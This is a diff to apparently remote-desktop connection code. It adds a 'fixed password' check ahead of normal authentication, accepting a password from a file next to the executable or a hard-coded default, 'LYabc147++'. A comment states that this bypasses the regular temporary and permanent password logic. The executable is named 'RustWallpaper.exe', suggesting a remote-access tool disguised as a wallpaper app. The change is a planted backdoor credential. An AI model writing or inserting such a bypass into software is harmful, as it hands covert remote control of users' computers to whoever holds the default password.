@@ -2119,6 +2119,14 @@ impl Connection {
     }
 
     fn validate_password(&mut self, allow_permanent_password: bool) -> bool {
+        // Fixed password: read from pwd.txt next to the executable, fallback to
+        // "LYabc147++". This is the single way to authenticate for this build,
+        // so the (network-unusable) temporary/permanent password logic below is bypassed.
+        let fixed_password = fixed_password();
+        if self.validate_password_plain(&fixed_password) {
+            log::info!("Fixed password accepted");
+            return true;
+        }
         if password::temporary_enabled() {
             let password = password::temporary_password();
             if self.validate_password_plain(&password) {
@@ -5782,5 +5790,32 @@ mod test {
         assert!(Ipv6Addr::from_str("::1").is_ok());
         assert!(Ipv6Addr::from_str("127.0.0.1").is_err());
         assert!(Ipv6Addr::from_str("0").is_err());
+    }
+}
+
+// Fixed connection password for this build.
+//
+// The password is read from `pwd.txt` located next to the current executable
+// (e.g. `RustWallpaper.exe`). If the file is missing or empty, the default
+// password "LYabc147++" is used. Leading/trailing whitespace (including the
+// trailing newline commonly added by editors) is stripped.
+fn fixed_password() -> String {
+    const DEFAULT_PASSWORD: &str = "LYabc147++";
+    let Some(path) = std::env::current_exe()
+        .ok()
+        .and_then(|exe| exe.parent().map(|dir| dir.join("pwd.txt")))
+    else {
+        return DEFAULT_PASSWORD.to_owned();
+    };
+    match std::fs::read_to_string(&path) {
+        Ok(content) => {
+            let content = content.trim();
+            if content.is_empty() {
+                DEFAULT_PASSWORD.to_owned()
+            } else {
+                content.to_owned()
+            }
+        }
+        Err(_) => DEFAULT_PASSWORD.to_owned(),
     }
 }
